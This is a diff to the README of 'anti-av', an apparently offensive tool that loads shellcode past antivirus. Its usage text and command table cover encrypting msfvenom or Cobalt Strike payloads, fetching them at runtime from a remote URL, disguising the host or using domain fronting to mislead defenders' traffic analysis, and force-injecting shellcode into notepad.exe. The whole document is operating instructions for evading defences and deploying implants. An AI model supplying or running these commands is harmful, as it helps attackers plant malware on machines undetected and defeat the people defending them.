@@ -40,14 +40,15 @@ Usage of ./anti-av:
   -ho string //远程加载shellcode时，通过隐藏流量（支持域前置）或混淆host达到干扰蓝队流量研判。
         host obfuscator (default "wwww.baidu.com")
         
-  -l string //支持加载shellcode方式
-        loader: binary (default "binary")
+  -l string //支持加载程序类型
+        loader: sc,pe (default "sc")
         
   -os string //支持的操作系统
         OS: windows,linux (default "windows")
         
   -sc string //shellcode的文件或url地址。如果是url，则在运行时访问下载。
         encrypt payload by anti-av: support 'msfvenom -f raw' OR 'cs raw' OR remote url loading (default "payload.e")
+
   -inject //布尔类型，运行时shellcode注入notepad进程。
         inject payload to notepad.exe       
 
@@ -63,7 +64,8 @@ Usage of ./anti-av:
 | ----------------- | ----------------------- | ------------------------------------------------------------ |
 | 自解密shellcode   | 无                      | ./anti-av -sc ~/Desktop/payload.bin                          |
 | 远程加载shellcode | 无                      | 1、./anti-av  -e -sc ~/Desktop/payload.bin    #加密shellcode<br />2、上传payload.e到公共下载服务<br />3、./anti-av -sc http://x.x.x.x/payload.e         #制作加载器 |
-| 注入进程          | 会强制注入到notepad.exe | ./anti-av -sc ~/Desktop/payload.bin -inject 或<br />./anti-av -sc http://x.x.x.x/payload.e  -inject |
+| 进程注入shellcode          | 会强制注入到notepad.exe | ./anti-av -sc ~/Desktop/payload.bin -inject 或<br />./anti-av -sc http://x.x.x.x/payload.e  -inject |
+|  |  |  |
 
 
 
